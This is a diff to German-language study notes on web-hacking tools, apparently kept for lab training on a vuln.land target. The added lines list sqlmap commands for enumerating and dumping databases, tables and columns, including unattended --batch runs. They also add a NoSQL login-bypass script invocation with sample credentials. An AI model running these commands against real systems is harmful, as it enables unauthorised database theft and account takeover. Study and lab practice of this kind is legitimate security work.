@@ -205,36 +205,52 @@ exit
 - Zugriff auf Kommandozeile: `sqlmap.py`
 	- Muss in PATH sein
 - Mit `sql-query` [SQL-Requests](https://i-am-takuma.medium.com/sqlmap-cheat-sheet-8dc29054528c) durchführen
+- [Cheat Sheet](https://resources.infosecinstitute.com/topic/important-sqlmap-commands/)
 
 ### Syntax
-- Alles (DBs / Tabellen) auf Website anzeigen(dauert lange):
+- Alles (DBs / Tabellen) auf Website anzeigen(dauert lange)
 ```
 sqlmap.py -u [POST-GET-URL] -a
 ```
 
-- Alle Daten von einer Tabelle anzeigen:
+- Alle Daten von einer Tabelle anzeigen
 ```
 sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --dump
 ```
 
-- DBs auf Website anzeigen:
+- DBs auf Website anzeigen
 ```
 sqlmap.py -u [POST-GET-URL] --dbs
 ```
 
-- Tabellen von bestimmter DB anzeigen:
+- Schema von DB anzeigen
+```
+sqlmap.py -u [POST-GET-URL] --schema
+```
+
+- Tabellen von bestimmter DB anzeigen
 ```
 sqlmap.py -u [POST-GET-URL] -D [Databasename] --tables
 ```
 
-- Spalten von bestimmter Tabelle anzeigen:
+- Spalten von bestimmter Tabelle anzeigen
 ```
 sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --columns
 ```
 
-- Daten von bestimmter Spalten anzeigen:
+- Daten von bestimmter Spalten anzeigen
 ```
 sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] -C [Columname] --dump
+```
+
+- Mit Zeitoptimierungen ausführen
+```
+sqlmap.py -u [POST-GET-URL] --tables -o
+```
+
+- Ohne Userinput ausführen
+```
+sqlmap.py -u [POST-GET-URL] --tables --batch
 ```
 
 ### Beispiel
@@ -272,6 +288,15 @@ sqlmap.py -u https://c8d0aa75-b9aa-4935-b206-2b0eaab5ecd5.idocker.vuln.land/spac
 ```
 
 ![[CleanShot 2022-09-07 at 12.00.18.png]]
+
+## [No-SQL-Attack Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)
+- Python Script für automatisierte Angriffe auf NoSQL
+
+### Syntax
+- Login Bypass
+```
+python3 nosql-login-bypass.py -t [POST-URL] -u customer0 -p compass
+```
 
 ## [hydra](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
 - Bruteforce Tool
